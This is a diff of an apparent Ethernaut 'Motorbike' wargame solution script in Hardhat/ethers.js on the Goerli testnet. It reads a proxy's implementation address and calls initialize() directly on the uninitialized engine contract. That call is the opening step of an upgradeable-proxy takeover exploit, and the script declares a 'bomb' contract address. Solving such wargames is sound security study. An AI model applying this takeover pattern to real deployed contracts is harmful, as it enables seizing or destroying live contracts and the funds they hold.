@@ -4,6 +4,7 @@ import { ethers } from "hardhat";
 const attackMotorbike = async () => {
     // change contract addresses here.
     const motorbikeAddress = "0xC4BB01C7AA492bdFF60f6989542d71DB7cb73Fd1"; //type "await contract.address()" in ethernaut console
+    const playerAddress = "0x3C4f1C7Ab126a94016CA8F4e770522810aa61954";
     const bombAddress = "0x3C4f1C7Ab126a94016CA8F4e770522810aa61954";
 
     // Don't touch below
@@ -25,6 +26,25 @@ const attackMotorbike = async () => {
     console.log("Cleaning to get 20 bytes address only");
     const implAddress1 = "0x" + implAddress.slice(-40);
     console.log(implAddress1);
+    console.log("Initializing at engine address");
+    // const initializeData = ethers.provider.encodeFunctionSignature("initialize()");
+
+    // await ethers.provider.sendTransaction({ from: player, to: implAddr, data: initializeData });
+
+    const provider = await ethers.getDefaultProvider("goerli");
+    /*Private Keys in .env file or hardcode here*/
+    const PRIVATE_KEY = process.env.PRIVATE_KEY || "";
+    const wallet = new Wallet(PRIVATE_KEY, provider);
+    const params = playerAddress;
+    const funcSign = ["function initialize() external initializer "];
+    const iface = new ethers.utils.Interface(funcSign);
+    const data = iface.encodeFunctionData("initialize()");
+    const tx1 = await wallet.sendTransaction({
+        from: playerAddress,
+        to: implAddress1,
+        data: data,
+    });
+    const txReceipt1 = await tx1.wait();
 };
 
 attackMotorbike()
